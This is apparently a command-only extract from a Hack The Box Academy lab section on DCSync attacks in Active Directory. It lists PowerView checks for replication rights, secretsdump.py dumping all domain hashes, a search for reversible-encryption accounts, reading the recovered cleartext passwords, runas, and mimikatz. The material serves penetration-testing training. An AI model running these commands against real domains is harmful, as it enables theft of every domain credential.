# Section 22: DCSync

- Module: Active Directory Enumeration & Attacks (143)
- URL: https://academy.hackthebox.com/app/module/143/section/1489
- Code/command blocks: 9

> Terminal output is omitted; only commands & scripts are captured.

## 1. `powershell` _(output omitted)_

```powershell
Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
```

## 2. `powershell` _(output omitted)_

```powershell
$sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
```

## 3. `shellsession` _(output omitted)_

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc {{DOMAIN_NB}}/adunn@{{DC_IP}} 
```

## 4. `shellsession` _(output omitted)_

```bash
ls inlanefreight_hashes*
```

## 5. `powershell` _(output omitted)_

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

## 6. `powershell` _(output omitted)_

```powershell
Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
```

## 7. `shellsession` _(output omitted)_

```bash
cat inlanefreight_hashes.ntds.cleartext 
```

## 8. `cmd` _(output omitted)_

```cmd
runas /netonly /user:{{DOMAIN_NB}}\adunn powershell
```

## 9. `powershell` _(output omitted)_

```powershell
.\mimikatz.exe
```

